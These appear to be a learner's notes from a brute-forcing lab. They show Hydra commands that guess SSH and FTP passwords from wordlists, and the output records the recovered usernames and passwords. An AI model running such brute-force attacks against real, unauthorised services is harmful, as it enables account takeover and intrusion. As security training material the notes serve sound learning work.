# Service Authentication Brute Forcing

### SSH Attack

```
hydra -l b.gates -P william.txt ssh://94.237.52.19:44199 -t 8 -f -I 
```

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-28 14:44:24
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 13093 login tries (l:1/p:13093), ~1637 tries per task
[DATA] attacking ssh://94.237.52.19:44199/
[44199][ssh] host: 94.237.52.19   login: b.gates   password: 4dn1l3M!$
[STATUS] attack finished for 94.237.52.19 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-28 14:44:28

```

### FTP Brute Forcing

```
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```

```
b.gates@ng-51753-bruteforcing-2-hlwo1-56cb9cfcdc-wjmf7:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-28 19:45:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ftp://127.0.0.1:21/
[21][ftp] host: 127.0.0.1   login: m.gates   password: computer
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-28 19:45:54
```
